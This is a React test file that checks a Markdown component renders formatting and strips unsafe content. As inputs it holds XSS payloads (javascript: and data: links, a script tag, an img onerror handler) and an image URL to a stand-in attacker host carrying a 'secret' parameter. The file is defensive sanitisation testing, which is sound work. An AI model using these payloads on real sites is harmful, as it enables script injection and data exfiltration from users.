import { render, screen } from "@testing-library/react";
import { describe, expect, test } from "vitest";

import { Markdown } from "./markdown";

describe("Markdown", () => {
  test("renders the formatting a reply uses", () => {
    const { container } = render(
      <Markdown>{"**bold** and *soft*\n\n- one\n- two\n\n1. first\n\n`code`"}</Markdown>,
    );

    expect(container.querySelector("strong")).toHaveTextContent("bold");
    expect(container.querySelector("em")).toHaveTextContent("soft");
    expect(container.querySelectorAll("ul li")).toHaveLength(2);
    expect(container.querySelector("ol li")).toHaveTextContent("first");
    expect(container.querySelector("code")).toHaveTextContent("code");
  });

  test("a web link opens in a new tab and gives nothing away", () => {
    render(<Markdown>{"[the docs](https://example.com/docs)"}</Markdown>);

    const link = screen.getByRole("link", { name: "the docs" });
    expect(link).toHaveAttribute("href", "https://example.com/docs");
    expect(link).toHaveAttribute("target", "_blank");
    expect(link).toHaveAttribute("rel", "noopener noreferrer");
  });

  test.each([
    ["javascript:", "[click](javascript:alert(1))"],
    ["data:", "[click](data:text/html;base64,PHNjcmlwdD4=)"],
    ["mailto:", "[click](mailto:someone@example.com)"],
    ["a relative path", "[click](/steal)"],
  ])("a %s link is not a link", (_, markdown) => {
    render(<Markdown>{markdown}</Markdown>);

    expect(screen.queryByRole("link")).not.toBeInTheDocument();
    expect(screen.getByText("click")).toBeInTheDocument();
  });

  test("raw HTML is shown as text and never becomes an element", () => {
    const { container } = render(
      <Markdown>{'<script>alert(1)</script> <img src=x onerror="alert(2)"> <a href="javascript:alert(3)">x</a>'}</Markdown>,
    );

    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("a")).toBeNull();
    expect(container.textContent).toContain("<script>");
  });

  test("an image is not loaded: its address could carry data out to another site", () => {
    const { container } = render(
      <Markdown>{"![tracking](https://evil.example/pixel.png?secret=1)"}</Markdown>,
    );

    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).not.toContain("evil.example");
  });

  test("text that only looks like markup stays text", () => {
    render(<Markdown>{"1 < 2 and 3 > 2"}</Markdown>);

    expect(screen.getByText("1 < 2 and 3 > 2")).toBeInTheDocument();
  });
});
